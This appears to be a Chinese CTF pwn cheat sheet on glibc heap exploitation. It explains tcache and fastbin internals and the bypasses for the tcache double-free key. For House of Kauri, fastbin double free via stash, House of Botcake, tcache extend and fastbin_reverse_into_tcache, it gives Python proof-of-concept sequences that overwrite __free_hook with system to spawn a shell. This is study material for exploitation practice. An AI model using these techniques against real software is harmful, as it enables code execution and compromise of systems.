---
{"dg-publish":true,"permalink":"/CakeVault/Pwn/cheatsheet/heap_cheatsheet/"}
---

## bin
[堆相关数据结构](堆相关数据结构.md)

1. **Fast bins**：
    - 大小范围：从16字节到128字节，步进为16字节。
    - 一般有10个fast bins（具体数量可能随系统和实现的不同而有所变化）。
    Fastbins\[idx=0, size=0x10]
    Fastbins\[idx=1, size=0x20]
    Fastbins\[idx=2, size=0x30]
    Fastbins\[idx=3, size=0x40]
    Fastbins\[idx=4, size=0x50]
    Fastbins\[idx=5, size=0x60]
    Fastbins\[idx=6, size=0x70]
1. **Small bins**：
    - 大小范围：从16(0x10)字节到512(0x200)字节，步进为8字节（对于4字节对齐系统）或16字节（对于8字节对齐系统）。
    - 每个大小对应一个bin。
2. **Large bins**：
    - 大小范围：512(0x200)字节以上。
    - bin大小不是线性增加，而是以较大的步进（例如128字节、256字节等）增加。



## double free
没edit，没有UAF，就没法hijack fd，就要用double free

## tcache key泄露堆地址

> [!info]- 详情
自 glibc2.29 版本起 tcache 新增了一个 key 字段，该字段位于 chunk 的 bk 字段，值为 tcache 结构体的地址，若 free() 检测到 `chunk->bk == tcache` 则会遍历 tcache 查找对应链表中是否有该chunk。最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制。
>
>由于 tcache 用的是 fd 字段所在地址，因此可以通过泄露 tcache key 来泄露堆地址。  
>![](/img/user/CakeVault/Pwn/cheatsheet/heap_imgs/tcache_key.png.png)
glibc-2.34 开始，tcache 的 key 不再是 `tcache_pthread_struct` 结构体地址，而是一个随机数 `tcache_key` ，因此不能通过 key 泄露堆地址。
>
> ```c
> // glibc-2.33
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
>
  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache;
> 
  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
> 
// glibc-2.34
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
> 
  /* Mark this chunk as "in the tcache" so the test in _int_free will
     detect a double free.  */
  e->key = tcache_key;
>
  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
>```

## tcache key绕过

### 破坏key
key字段写入任意字节即可破坏
#### 条件
溢出至少1字节
### house of kauri
通过修改 `size` 使两次 `free` 的同一块内存进入不同的 `entries` 。
#### 条件
堆块大小(tcache)，溢出0x8字节 (size)，悬挂指针
#### poc
```python
add_chunk(0, 0x18)
add_chunk(1, 0x10)
delete_chunk(1)
edit_chunk(0, 'a' * 0x18 + p64(0x30))
delete_chunk(1)
```

### tcache stash with fastbin double free

> [!info]- 介绍
> 在 fastbin 中并没有严密的 double free 检测，我们可以在填满对应的 tcache 链条后在 fastbin 中完成 double free，随后通过 stash 机制将 > fastbin 中 chunk 倒回 tcache 中。此时 fast bin double free 就变成了 tcache double free 。
> ![](/img/user/CakeVault/Pwn/cheatsheet/heap_imgs/tcache_stash_with_fastbin.png.png)
#### 条件
堆块大小(tcache), 能分配且释放9个chunk，悬挂指针
#### poc
```python
for i in range(9):
    add_chunk(i, 0x10)
 
for i in range(2, 9):
    delete_chunk(i)

# fastbin double free
delete_chunk(0)
delete_chunk(1)
delete_chunk(0)

# use up tcache
for i in range(2, 9):
    add_chunk(i, 0x10)

# hijacking
add_chunk(0, 0x10)
edit_chunk(0, p64(libc.sym['__free_hook']))
add_chunk(0, 0x10)
add_chunk(0, 0x10)
add_chunk(0, 0x10)
edit_chunk(0, p64(libc.sym['system']))

# trigger
edit_chunk(1,'/bin/sh\x00')
delete_chunk(1)
```

### House of Botcake

> [!info]- 介绍
> 同一个 chunk 释放到 tcache 和 unsorted bin 中。释放在 unsorted bin 的 chunk 借助堆块合并改变大小。相对于上一个方法，这个方法的好处是一次 double free 可以多次使用，因为控制同一块内存的 chunk 大小不同。
> ![](/img/user/CakeVault/Pwn/cheatsheet/heap_imgs/botcake.png)
#### 条件
堆块大小small_bin，能分配且释放9个chunk，悬挂指针
#### poc
```python
for i in range(10):
    add_chunk(i, 0x200)

# fill tcache
for i in range(7):
    delete_chunk(i)

# merge 7 & 8 chunk
delete_chunk(8)
delete_chunk(7)

# free 8 into tcache
add_chunk(0, 0x200)
delete_chunk(8)

# take out chunk 7 which contains chunk 8
add_chunk(7, 0x410)
edit_chunk(7, 'a' * 0x210 + p64(libc.sym['__free_hook'])) # hijack 8's fd

# attack free hook via tcache fd
add_chunk(0, 0x200)
add_chunk(0, 0x200)
edit_chunk(0,p64(libc.sym['system']))

# trigger
edit_chunk(2,'/bin/sh\x00')
delete_chunk(2)
```

## chunk overlapping
### tcache extend
修改 chunk 的 size 然后释放并重新申请出来就可以造成堆块重叠。
#### 条件
溢出size(0x8字节)
#### poc
```python
add_chunk(0, 0x10)
add_chunk(1, 0x10)
add_chunk(2, 0x10)

# modify chunk 1 size via chunk 0 overflow
edit_chunk(0, 'a' * 0x10 + p64(0) + p64(0x100))

# now chunk 1 contains chunk 2
delete_chunk(1)
add_chunk(1, 0xf0)
delete_chunk(2)

# hijack chunk 2's fd via editing chunk 1
edit_chunk(1, 'a' * 0x20 + p64(libc.sym['__free_hook']))

# attack free hook
add_chunk(2, 0x10)
add_chunk(2, 0x10)
edit_chunk(2, p64(libc.sym['system']))
edit_chunk(0,'/bin/sh\x00')
delete_chunk(0)
```

## fastbin_reverse_into_tcache

> [!info]- 介绍
> calloc 申请内存不会从 tcache 中获取，而是从 fast bin 中获取。取完后，会将 fast bin 中的 chunk 放入 tcache 中。如果修改 fast bin 中 chunk > 的 fd 指针，则会在 fd + 0x10 地址处写入一个较大的值。  
> ![在这里插入图片描述](/img/user/CakeVault/Pwn/cheatsheet/heap_imgs/fastbin_reverse_into_tcache.png)  
> 如果是使用 malloc 可以先消耗完 tcache 中的 chunk 然后再触发 stash 机制完成攻击。不过为了防止 target 的 fd 指向无效地址，需要在 fast bin 中预留另外 6 个 chunk 来填满 tcache 。
### 条件
malloc: 14个chunk
calloc: 8个chunk
### poc
```python
for i in range(14): add_chunk(i, 0x50)
for i in range(14): delete_chunk(i)

# tcache count 7->6
add_chunk(0, 0x50)

# free chunk 7 into tcache, now chunk 7 both in tcache and fastbin
delete_chunk(7)

# take chunk 7 out of tcache
add_chunk(7, 0x50)
# function as UAF
edit_chunk(7, p64(libc.sym['__free_hook'] - 0x10))

# cleanup tcache
for i in range(1, 7): add_chunk(i, 0x50)

# trigger stash
add_chunk(7, 0x50)

# chunk 7
# tcache: 7->8->9->10->11->12->13
add_chunk(7, 0x50)
edit_chunk(7, p64(libc.sym['system']))

edit_chunk(0,'/bin/sh\x00')
delete_chunk(0)
```